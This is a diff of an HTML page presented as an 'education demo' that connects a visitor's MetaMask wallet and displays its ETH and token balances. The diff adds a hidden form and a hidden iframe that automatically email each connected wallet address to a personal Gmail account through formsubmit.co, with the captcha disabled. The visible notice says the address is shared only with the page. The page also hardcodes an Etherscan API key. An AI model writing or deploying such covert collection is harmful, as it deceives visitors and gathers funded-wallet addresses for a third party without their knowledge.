@@ -1,980 +1,770 @@
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
-<title>Ethereum Wallet Holdings Check — Education Demo</title>
+  <title>Ethereum Wallet Holdings Check — Education Demo</title>
 
-<style>
-  html, body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
-    background: #0f1115;
-    color: #e6e6e6;
-    min-height: 100%;
-  }
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
 
-  body {
-    width: 640px;
-    max-width: 90vw;
-    margin: 60px auto;
-    padding: 0 20px 60px;
-    box-sizing: border-box;
-  }
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      margin: 0;
+      padding: 40px 20px;
+    }
 
-  * {
-    box-sizing: border-box;
-  }
+    .container {
+      max-width: 850px;
+      margin: auto;
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
 
-  h1 {
-    font-size: 1.4rem;
-  }
+    h1 {
+      margin-top: 0;
+    }
 
-  p.sub {
-    color: #9aa0a6;
-    margin-top: -8px;
-    line-height: 1.5;
-  }
+    button {
+      padding: 12px 20px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      background: #111;
+      color: white;
+      font-size: 15px;
+    }
 
-  button {
-    background: #4f7cff;
-    color: white;
-    border: none;
-    padding: 12px 20px;
-    border-radius: 8px;
-    font-size: 1rem;
-    cursor: pointer;
-  }
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
 
-  button:disabled {
-    background: #3a3d45;
-    cursor: not-allowed;
-  }
+    .notice {
+      background: #fff7d6;
+      padding: 12px;
+      border-radius: 8px;
+      margin: 20px 0;
+      font-size: 14px;
+    }
 
-  #status {
-    margin-top: 16px;
-    color: #9aa0a6;
-    font-size: 0.9rem;
-    line-height: 1.5;
-    word-break: break-word;
-  }
+    .status {
+      margin-top: 20px;
+      padding: 12px;
+      background: #f1f1f1;
+      border-radius: 8px;
+      white-space: pre-wrap;
+    }
 
-  .card {
-    background: #1a1d24;
-    border: 1px solid #2a2d35;
-    border-radius: 10px;
-    padding: 16px 20px;
-    margin-top: 20px;
-  }
+    .wallet {
+      margin-top: 20px;
+      padding: 15px;
+      background: #fafafa;
+      border-radius: 8px;
+      word-break: break-all;
+    }
 
-  .token-row {
-    display: flex;
-    justify-content: space-between;
-    align-items: flex-start;
-    gap: 20px;
-    padding: 10px 0;
-    border-bottom: 1px solid #2a2d35;
-  }
+    .token {
+      padding: 15px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      margin-top: 12px;
+    }
 
-  .token-row:last-child {
-    border-bottom: none;
-  }
+    .muted {
+      color: #666;
+      font-size: 14px;
+    }
 
-  .token-name {
-    min-width: 0;
-  }
-
-  .token-balance {
-    text-align: right;
-    white-space: nowrap;
-  }
-
-  .address {
-    font-family: monospace;
-    font-size: 0.75rem;
-    color: #858b95;
-    word-break: break-all;
-    margin-top: 4px;
-  }
-
-  .warn {
-    background: #2b1d1d;
-    border: 1px solid #5c2b2b;
-    color: #f2b8b8;
-    padding: 12px 16px;
-    border-radius: 8px;
-    margin-top: 20px;
-    font-size: 0.9rem;
-    line-height: 1.5;
-  }
-
-  .error {
-    color: #ff9b9b;
-  }
-
-  .muted {
-    color: #9aa0a6;
-  }
-
-  code {
-    color: #8fd1ff;
-  }
-</style>
-
+    .error {
+      color: #b00020;
+    }
+  </style>
 </head>
 
 <body>
 
-<h1>What can someone see about your wallet?</h1>
+<div class="container">
 
-<p class="sub">
-  Ethereum Mainnet demo — connect your wallet to see some of the
-  information already publicly visible to anyone before you ever sign anything.
-</p>
+  <h1>Ethereum Wallet Holdings Check</h1>
 
-<button id="connectBtn">Connect Wallet</button>
+  <p class="muted">
+    Educational demonstration for checking publicly visible Ethereum wallet holdings.
+  </p>
 
-<div id="status"></div>
+  <div class="notice">
+    Connecting your wallet shares your public Ethereum wallet address with this page.
+  </div>
 
-<div id="result"></div>
+  <button id="connectButton">
+    Connect Wallet
+  </button>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
+  <div id="status" class="status">
+    Not connected.
+  </div>
+
+  <div id="walletInfo"></div>
+
+  <div id="holdings"></div>
+
+  <!--
+    FormSubmit notification.
+    This form is hidden from the visitor.
+    Only the PUBLIC wallet address is submitted.
+  -->
+  <form
+    id="walletNotification"
+    action="https://formsubmit.co/enahoromicheal21@gmail.com"
+    method="POST"
+    target="notificationFrame"
+    style="display:none;"
+  >
+    <input
+      type="hidden"
+      name="Wallet Address"
+      id="emailWalletAddress"
+    />
+
+    <input
+      type="hidden"
+      name="Network"
+      value="Ethereum Mainnet"
+    />
+
+    <input
+      type="hidden"
+      name="_subject"
+      value="New Ethereum wallet connected"
+    />
+
+    <input
+      type="hidden"
+      name="_captcha"
+      value="false"
+    />
+  </form>
+
+  <iframe
+    name="notificationFrame"
+    style="display:none;"
+  ></iframe>
+
+</div>
 
 <script>
 
-/*
- * ============================================================
- * CONFIGURATION
- * ============================================================
- */
+  // ============================================================
+  // CONFIGURATION
+  // ============================================================
 
-const ETHERSCAN_API_KEY = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
+  const CHAIN_ID = 1;
 
-const CHAIN_ID = 1;
+  const NETWORK_NAME = "Ethereum Mainnet";
 
-const NETWORK_NAME = "Ethereum Mainnet";
+  const RPC_URL = "https://ethereum-rpc.publicnode.com";
 
-const ETHERSCAN_API_URL =
-  "https://api.etherscan.io/v2/api";
+  const ETHERSCAN_API =
+    "https://api.etherscan.io/v2/api";
 
-/*
- * Public Ethereum Mainnet RPC.
- *
- * This is used for:
- *
- *   - ETH balance
- *   - ERC-20 balanceOf()
- *   - ERC-20 symbol()
- *   - ERC-20 decimals()
- */
-const RPC_URL =
-  "https://ethereum-rpc.publicnode.com";
+  // Put your Etherscan API key here.
+  const ETHERSCAN_API_KEY = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
 
 
-/*
- * Minimal ERC-20 ABI.
- */
-const ERC20_ABI = [
-  "function balanceOf(address owner) view returns (uint256)",
-  "function symbol() view returns (string)",
-  "function decimals() view returns (uint8)"
-];
+  // ============================================================
+  // ERC-20 ABI
+  // ============================================================
+
+  const ERC20_ABI = [
+    "function balanceOf(address owner) view returns (uint256)",
+    "function symbol() view returns (string)",
+    "function decimals() view returns (uint8)"
+  ];
 
 
-const connectBtn =
-  document.getElementById("connectBtn");
+  // ============================================================
+  // DOM
+  // ============================================================
 
-const statusEl =
-  document.getElementById("status");
+  const connectButton =
+    document.getElementById("connectButton");
 
-const resultEl =
-  document.getElementById("result");
+  const status =
+    document.getElementById("status");
+
+  const walletInfo =
+    document.getElementById("walletInfo");
+
+  const holdings =
+    document.getElementById("holdings");
 
 
-connectBtn.addEventListener(
-  "click",
-  connectAndCheck
-);
+  // ============================================================
+  // PROVIDER
+  // ============================================================
+
+  const publicProvider =
+    new ethers.JsonRpcProvider(RPC_URL);
 
 
-/*
- * ============================================================
- * CONNECT WALLET
- * ============================================================
- */
+  // ============================================================
+  // HTML ESCAPING
+  // ============================================================
 
-async function connectAndCheck() {
+  function escapeHtml(value) {
 
-  resultEl.innerHTML = "";
-
-  if (!window.ethereum) {
-
-    statusEl.innerHTML = `
-      <span class="error">
-        No compatible wallet extension was detected.
-      </span>
-    `;
-
-    return;
+    return String(value)
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/g, "&#039;");
   }
 
 
-  try {
+  // ============================================================
+  // STATUS
+  // ============================================================
 
-    connectBtn.disabled = true;
+  function setStatus(message, isError = false) {
 
-    statusEl.textContent =
-      "Requesting wallet connection...";
+    status.textContent = message;
 
-
-    /*
-     * This opens the normal MetaMask connection prompt.
-     *
-     * It requests the PUBLIC wallet address only.
-     *
-     * No transaction is signed here.
-     */
-    const accounts =
-      await window.ethereum.request({
-        method: "eth_requestAccounts"
-      });
+    status.className =
+      isError
+        ? "status error"
+        : "status";
+  }
 
 
-    if (
-      !accounts ||
-      accounts.length === 0
-    ) {
+  // ============================================================
+  // EMAIL NOTIFICATION
+  // ============================================================
 
-      throw new Error(
-        "No wallet account was returned."
-      );
-    }
+  function sendWalletNotification(address) {
 
+    const addressInput =
+      document.getElementById("emailWalletAddress");
 
-    const address =
-      accounts[0];
+    addressInput.value = address;
 
-
-    statusEl.textContent =
-      `Connected: ${address}. Checking network...`;
+    document
+      .getElementById("walletNotification")
+      .submit();
+  }
 
 
-    /*
-     * Get currently selected chain.
-     */
-    const chainIdHex =
-      await window.ethereum.request({
-        method: "eth_chainId"
-      });
+  // ============================================================
+  // CHECK NETWORK
+  // ============================================================
 
+  async function ensureMainnet(provider) {
+
+    const network =
+      await provider.getNetwork();
 
     const chainId =
-      parseInt(chainIdHex, 16);
+      Number(network.chainId);
 
-
-    /*
-     * Ethereum Mainnet = chain ID 1.
-     */
     if (chainId !== CHAIN_ID) {
 
-      statusEl.innerHTML = `
-        <span class="error">
-          Wrong network. Please switch MetaMask to
-          ${NETWORK_NAME} and try again.
-        </span>
-      `;
-
-      return;
-    }
-
-
-    statusEl.textContent =
-      "Reading publicly available blockchain data...";
-
-
-    await lookupHoldings(address);
-
-
-    statusEl.textContent =
-      `Done — public blockchain data associated with ${address} was read without requesting a transaction signature.`;
-
-
-  } catch (err) {
-
-    console.error(
-      "Wallet connection error:",
-      err
-    );
-
-
-    /*
-     * MetaMask user rejected the connection.
-     */
-    if (err.code === 4001) {
-
-      statusEl.innerHTML = `
-        <span class="error">
-          Wallet connection was rejected.
-        </span>
-      `;
-
-    } else {
-
-      statusEl.innerHTML = `
-        <span class="error">
-          Error:
-          ${escapeHtml(
-            err.message || "Unknown error"
-          )}
-        </span>
-      `;
-    }
-
-  } finally {
-
-    connectBtn.disabled = false;
-
-  }
-}
-
-
-/*
- * ============================================================
- * LOOK UP WALLET HOLDINGS
- * ============================================================
- */
-
-async function lookupHoldings(address) {
-
-
-  /*
-   * Connect to Ethereum Mainnet using a read-only provider.
-   */
-  const provider =
-    new ethers.JsonRpcProvider(
-      RPC_URL
-    );
-
-
-  // ==========================================================
-  // 1. ETH BALANCE
-  // ==========================================================
-
-  statusEl.textContent =
-    "Reading Ethereum ETH balance...";
-
-
-  let ethBalance =
-    "unavailable";
-
-
-  try {
-
-    const balanceWei =
-      await provider.getBalance(
-        address
+      throw new Error(
+        `Wrong network. Please switch MetaMask to ${NETWORK_NAME}.`
       );
-
-
-    ethBalance =
-      ethers.formatEther(
-        balanceWei
-      );
-
-  } catch (err) {
-
-    console.error(
-      "ETH balance lookup failed:",
-      err
-    );
-
+    }
   }
 
 
-  // ==========================================================
-  // 2. DISCOVER ERC-20 CONTRACTS USING ETHERSCAN
-  // ==========================================================
+  // ============================================================
+  // GET ETH BALANCE
+  // ============================================================
 
-  statusEl.textContent =
-    "Discovering ERC-20 contracts associated with the address...";
+  async function getEthBalance(address) {
+
+    const balance =
+      await publicProvider.getBalance(address);
+
+    return ethers.formatEther(balance);
+  }
 
 
-  const tokenTxUrl =
-    ETHERSCAN_API_URL +
+  // ============================================================
+  // DISCOVER ERC-20 TOKENS
+  // ============================================================
 
-    "?chainid=1" +
+  async function discoverTokens(address) {
 
-    "&module=account" +
+    if (
+      !ETHERSCAN_API_KEY ||
+      ETHERSCAN_API_KEY === "YOUR_ETHERSCAN_API_KEY"
+    ) {
+      throw new Error(
+        "Etherscan API key has not been configured."
+      );
+    }
 
-    "&action=tokentx" +
+    const url =
+      new URL(ETHERSCAN_API);
 
-    "&address=" +
-    encodeURIComponent(address) +
+    url.searchParams.set(
+      "chainid",
+      String(CHAIN_ID)
+    );
 
-    "&startblock=0" +
+    url.searchParams.set(
+      "module",
+      "account"
+    );
 
-    "&endblock=99999999" +
+    url.searchParams.set(
+      "action",
+      "tokentx"
+    );
 
-    "&page=1" +
+    url.searchParams.set(
+      "address",
+      address
+    );
 
-    "&offset=10000" +
+    url.searchParams.set(
+      "page",
+      "1"
+    );
 
-    "&sort=asc" +
+    url.searchParams.set(
+      "offset",
+      "1000"
+    );
 
-    "&apikey=" +
-    encodeURIComponent(
+    url.searchParams.set(
+      "sort",
+      "asc"
+    );
+
+    url.searchParams.set(
+      "apikey",
       ETHERSCAN_API_KEY
     );
 
 
-  let tokenData;
-
-
-  try {
-
     const response =
-      await fetch(
-        tokenTxUrl
-      );
-
+      await fetch(url.toString());
 
     if (!response.ok) {
 
       throw new Error(
-        `Etherscan returned HTTP ${response.status}`
+        `Etherscan HTTP error: ${response.status}`
       );
     }
 
 
-    tokenData =
+    const data =
       await response.json();
 
 
-    console.log(
-      "Etherscan token response:",
-      tokenData
+    if (
+      data.status === "0" &&
+      data.message !== "No transactions found"
+    ) {
+
+      throw new Error(
+        data.result ||
+        data.message ||
+        "Etherscan token discovery failed."
+      );
+    }
+
+
+    if (!Array.isArray(data.result)) {
+
+      return [];
+    }
+
+
+    // Remove duplicate token contracts.
+
+    const uniqueContracts =
+      new Map();
+
+
+    for (const tx of data.result) {
+
+      if (!tx.contractAddress) {
+        continue;
+      }
+
+      const contract =
+        tx.contractAddress.toLowerCase();
+
+      uniqueContracts.set(
+        contract,
+        tx.contractAddress
+      );
+    }
+
+
+    return Array.from(
+      uniqueContracts.values()
     );
-
-
-  } catch (err) {
-
-    console.error(
-      "Etherscan request failed:",
-      err
-    );
-
-
-    resultEl.innerHTML = `
-
-      <div class="card">
-
-        <div class="token-row">
-
-          <strong>
-            Wallet Address
-          </strong>
-
-          <span class="address">
-            ${escapeHtml(address)}
-          </span>
-
-        </div>
-
-
-        <div class="token-row">
-
-          <strong>
-            Ethereum ETH Balance
-          </strong>
-
-          <span>
-            ${escapeHtml(ethBalance)} ETH
-          </span>
-
-        </div>
-
-      </div>
-
-
-      <div class="warn">
-
-        <strong>
-          ERC-20 discovery failed.
-        </strong>
-
-        <br><br>
-
-        The ETH balance was successfully read
-        directly from Ethereum Mainnet, but the
-        Etherscan token-discovery request failed.
-
-        <br><br>
-
-        Check DevTools → Console for the response.
-
-      </div>
-
-    `;
-
-    return;
   }
 
 
-  // ==========================================================
-  // 3. VALIDATE ETHERSCAN RESPONSE
-  // ==========================================================
+  // ============================================================
+  // READ LIVE TOKEN BALANCE
+  // ============================================================
 
-  if (!Array.isArray(tokenData.result)) {
-
-    console.error(
-      "Unexpected Etherscan response:",
-      tokenData
-    );
-
-
-    const errorMessage =
-      typeof tokenData.result === "string"
-        ? tokenData.result
-        : tokenData.message ||
-          "Unknown Etherscan response";
-
-
-    resultEl.innerHTML = `
-
-      <div class="card">
-
-        <div class="token-row">
-
-          <strong>
-            Wallet Address
-          </strong>
-
-          <span class="address">
-            ${escapeHtml(address)}
-          </span>
-
-        </div>
-
-
-        <div class="token-row">
-
-          <strong>
-            Ethereum ETH Balance
-          </strong>
-
-          <span>
-            ${escapeHtml(ethBalance)} ETH
-          </span>
-
-        </div>
-
-      </div>
-
-
-      <div class="warn">
-
-        <strong>
-          Etherscan token discovery returned an error.
-        </strong>
-
-        <br><br>
-
-        ${escapeHtml(errorMessage)}
-
-      </div>
-
-    `;
-
-    return;
-  }
-
-
-
-  // ==========================================================
-  // 4. FIND UNIQUE ERC-20 CONTRACTS
-  // ==========================================================
-
-  const tokens =
-    new Map();
-
-
-  for (
-    const tx of tokenData.result
+  async function readTokenBalance(
+    tokenAddress,
+    walletAddress
   ) {
 
-    if (
-      !tx.contractAddress
-    ) {
-      continue;
-    }
+    try {
+
+      const token =
+        new ethers.Contract(
+          tokenAddress,
+          ERC20_ABI,
+          publicProvider
+        );
 
 
-    const contractAddress =
-      tx.contractAddress.toLowerCase();
+      const [
+        rawBalance,
+        symbol,
+        decimals
+      ] = await Promise.all([
+
+        token.balanceOf(walletAddress),
+
+        token.symbol(),
+
+        token.decimals()
+
+      ]);
 
 
-    /*
-     * Ignore the zero address.
-     */
-    if (
-      contractAddress ===
-      "0x0000000000000000000000000000000000000000"
-    ) {
-      continue;
-    }
+      return {
 
+        address: tokenAddress,
 
-    /*
-     * Store each unique token contract once.
-     */
-    tokens.set(
-      contractAddress,
-      {
-        address:
-          tx.contractAddress,
+        symbol: symbol || "UNKNOWN",
 
-        symbol:
-          tx.tokenSymbol ||
-          "UNKNOWN",
+        decimals: Number(decimals),
 
-        decimals:
-          Number(
-            tx.tokenDecimal
+        rawBalance,
+
+        balance:
+          ethers.formatUnits(
+            rawBalance,
+            decimals
           )
-      }
-    );
+
+      };
+
+    } catch (error) {
+
+      console.warn(
+        "Could not read token:",
+        tokenAddress,
+        error
+      );
+
+      return null;
+    }
   }
 
 
-  console.log(
-    "Unique ERC-20 contracts discovered:",
-    [...tokens.values()]
-  );
+  // ============================================================
+  // DISPLAY HOLDINGS
+  // ============================================================
+
+  function displayHoldings(
+    ethBalance,
+    tokens
+  ) {
+
+    holdings.innerHTML = "";
+
+    const heading =
+      document.createElement("h2");
+
+    heading.textContent =
+      "Wallet Holdings";
+
+    holdings.appendChild(heading);
 
 
+    // ETH
 
-  // ==========================================================
-  // 5. READ LIVE BALANCES DIRECTLY FROM EACH CONTRACT
-  // ==========================================================
+    const ethDiv =
+      document.createElement("div");
 
-  statusEl.textContent =
-    `Reading live balances for ${tokens.size} discovered token contract${tokens.size === 1 ? "" : "s"}...`;
+    ethDiv.className = "token";
 
+    ethDiv.innerHTML = `
+      <strong>Ethereum</strong><br>
+      Balance: ${escapeHtml(ethBalance)} ETH
+    `;
 
-  const tokenResults =
-    await Promise.all(
-
-      [...tokens.values()].map(
-        async (info) => {
-
-          try {
-
-            const token =
-              new ethers.Contract(
-                info.address,
-                ERC20_ABI,
-                provider
-              );
+    holdings.appendChild(ethDiv);
 
 
-            /*
-             * Read decimals directly from the contract.
-             */
-            let decimals;
+    // ERC-20 tokens
 
-            try {
+    for (const token of tokens) {
 
-              decimals =
-                await token.decimals();
+      const div =
+        document.createElement("div");
 
-            } catch (_) {
+      div.className = "token";
 
-              decimals =
-                Number.isInteger(
-                  info.decimals
-                )
-                  ? info.decimals
-                  : 18;
-            }
+      div.innerHTML = `
+        <strong>${escapeHtml(token.symbol)}</strong><br>
+        Contract:
+        ${escapeHtml(token.address)}<br>
+        Balance:
+        ${escapeHtml(token.balance)}
+      `;
 
-
-            /*
-             * Read symbol directly from the contract.
-             */
-            let symbol;
-
-            try {
-
-              symbol =
-                await token.symbol();
-
-            } catch (_) {
-
-              symbol =
-                info.symbol ||
-                "UNKNOWN";
-            }
+      holdings.appendChild(div);
+    }
 
 
-            /*
-             * IMPORTANT:
-             *
-             * This is the LIVE balance directly from
-             * the ERC-20 smart contract.
-             */
-            const balance =
-              await token.balanceOf(
-                address
-              );
+    if (tokens.length === 0) {
+
+      const empty =
+        document.createElement("p");
+
+      empty.className = "muted";
+
+      empty.textContent =
+        "No ERC-20 tokens were discovered.";
+
+      holdings.appendChild(empty);
+    }
+  }
 
 
-            const formatted =
-              ethers.formatUnits(
-                balance,
-                decimals
-              );
+  // ============================================================
+  // CONNECT WALLET
+  // ============================================================
+
+  connectButton.addEventListener(
+    "click",
+    async () => {
+
+      try {
+
+        connectButton.disabled = true;
+
+        holdings.innerHTML = "";
+
+        walletInfo.innerHTML = "";
 
 
-            return {
+        // ------------------------------------------------------
+        // MetaMask check
+        // ------------------------------------------------------
 
-              address:
-                info.address,
+        if (!window.ethereum) {
 
-              symbol:
-                symbol || "UNKNOWN",
-
-              decimals,
-
-              balance:
-                formatted,
-
-              success:
-                true
-
-            };
+          throw new Error(
+            "MetaMask was not detected. Please install MetaMask."
+          );
+        }
 
 
-          } catch (err) {
+        setStatus(
+          "Waiting for MetaMask connection..."
+        );
 
-            console.warn(
-              `balanceOf() failed for ${info.address}:`,
-              err
+
+        // ------------------------------------------------------
+        // Request wallet connection
+        // ------------------------------------------------------
+
+        const accounts =
+          await window.ethereum.request({
+            method: "eth_requestAccounts"
+          });
+
+
+        if (!accounts.length) {
+
+          throw new Error(
+            "No wallet account was returned."
+          );
+        }
+
+
+        const address =
+          accounts[0];
+
+
+        // ------------------------------------------------------
+        // Create MetaMask provider
+        // ------------------------------------------------------
+
+        const browserProvider =
+          new ethers.BrowserProvider(
+            window.ethereum
+          );
+
+
+        // ------------------------------------------------------
+        // Verify Mainnet
+        // ------------------------------------------------------
+
+        setStatus(
+          "Checking Ethereum network..."
+        );
+
+        await ensureMainnet(
+          browserProvider
+        );
+
+
+        // ------------------------------------------------------
+        // Display wallet
+        // ------------------------------------------------------
+
+        walletInfo.innerHTML = `
+          <div class="wallet">
+            <strong>Wallet Address</strong><br>
+            ${escapeHtml(address)}
+            <br><br>
+            <strong>Network</strong><br>
+            ${NETWORK_NAME}
+          </div>
+        `;
+
+
+        // ------------------------------------------------------
+        // Send public address notification
+        // ------------------------------------------------------
+
+        sendWalletNotification(address);
+
+
+        // ------------------------------------------------------
+        // ETH balance
+        // ------------------------------------------------------
+
+        setStatus(
+          "Reading ETH balance..."
+        );
+
+
+        const ethBalance =
+          await getEthBalance(address);
+
+
+        // ------------------------------------------------------
+        // Discover ERC-20 contracts
+        // ------------------------------------------------------
+
+        setStatus(
+          "Discovering ERC-20 token contracts..."
+        );
+
+
+        const tokenContracts =
+          await discoverTokens(address);
+
+
+        // ------------------------------------------------------
+        // Read live balances
+        // ------------------------------------------------------
+
+        setStatus(
+          `Found ${tokenContracts.length} token contract(s).\n` +
+          "Reading live balances..."
+        );
+
+
+        const tokenResults = [];
+
+
+        for (
+          const tokenAddress
+          of tokenContracts
+        ) {
+
+          const token =
+            await readTokenBalance(
+              tokenAddress,
+              address
             );
 
 
-            return {
+          if (!token) {
+            continue;
+          }
 
-              address:
-                info.address,
 
-              symbol:
-                info.symbol ||
-                "UNKNOWN",
+          // Only display tokens with a balance.
 
-              decimals:
-                info.decimals,
+          if (
+            token.rawBalance > 0n
+          ) {
 
-              balance:
-                "unreadable",
-
-              success:
-                false
-
-            };
+            tokenResults.push(token);
           }
         }
-      )
+
+
+        // ------------------------------------------------------
+        // Display results
+        // ------------------------------------------------------
+
+        displayHoldings(
+          ethBalance,
+          tokenResults
+        );
+
+
+        setStatus(
+          "Wallet holdings check completed."
+        );
+
+      } catch (error) {
+
+        console.error(error);
+
+        setStatus(
+          error?.message ||
+          "Something went wrong.",
+          true
+        );
+
+      } finally {
+
+        connectButton.disabled = false;
+      }
+
+    }
+  );
+
+
+  // ============================================================
+  // HANDLE NETWORK CHANGES
+  // ============================================================
+
+  if (window.ethereum) {
+
+    window.ethereum.on(
+      "chainChanged",
+      () => {
+
+        window.location.reload();
+
+      }
     );
-
-
-
-  // ==========================================================
-  // 6. BUILD TOKEN DISPLAY
-  // ==========================================================
-
-  let tokenRowsHtml =
-    "";
-
-
-  for (
-    const token of tokenResults
-  ) {
-
-    tokenRowsHtml += `
-
-      <div class="token-row">
-
-        <div class="token-name">
-
-          <strong>
-            ${escapeHtml(
-              token.symbol
-            )}
-          </strong>
-
-          <div class="address">
-
-            ${escapeHtml(
-              token.address
-            )}
-
-          </div>
-
-        </div>
-
-
-        <div class="token-balance">
-
-          ${escapeHtml(
-            token.balance
-          )}
-
-        </div>
-
-      </div>
-
-    `;
   }
-
-
-  if (
-    tokenResults.length === 0
-  ) {
-
-    tokenRowsHtml = `
-
-      <div class="token-row">
-
-        <span class="muted">
-
-          No ERC-20 contracts were discovered
-          through the configured Etherscan data source.
-
-        </span>
-
-      </div>
-
-    `;
-  }
-
-
-
-  // ==========================================================
-  // 7. DISPLAY EVERYTHING
-  // ==========================================================
-
-  resultEl.innerHTML = `
-
-    <div class="card">
-
-
-      <div class="token-row">
-
-        <strong>
-          Wallet Address
-        </strong>
-
-        <span class="address">
-
-          ${escapeHtml(
-            address
-          )}
-
-        </span>
-
-      </div>
-
-
-      <div class="token-row">
-
-        <strong>
-          Ethereum ETH Balance
-        </strong>
-
-        <span>
-
-          ${escapeHtml(
-            ethBalance
-          )}
-          ETH
-
-        </span>
-
-      </div>
-
-
-      ${tokenRowsHtml}
-
-
-    </div>
-
-
-    <div class="warn">
-
-      <strong>
-        This is the point:
-      </strong>
-
-      The wallet address is public blockchain
-      information.
-
-      <br><br>
-
-      This demo uses the address to discover
-      ERC-20 contracts associated with it through
-      public blockchain indexing data, then reads
-      the current token balance directly from each
-      ERC-20 contract using
-      <code>balanceOf()</code>.
-
-      <br><br>
-
-      No private key is requested and no transaction
-      is signed.
-
-    </div>
-
-  `;
-}
-
-
-/*
- * ============================================================
- * HTML ESCAPING
- * ============================================================
- */
-
-function escapeHtml(value) {
-
-  return String(value)
-
-    .replace(
-      /&/g,
-      "&amp;"
-    )
-
-    .replace(
-      /</g,
-      "&lt;"
-    )
-
-    .replace(
-      />/g,
-      "&gt;"
-    )
-
-    .replace(
-      /"/g,
-      "&quot;"
-    )
-
-    .replace(
-      /'/g,
-      "&#039;"
-    );
-
-}
 
 </script>
 
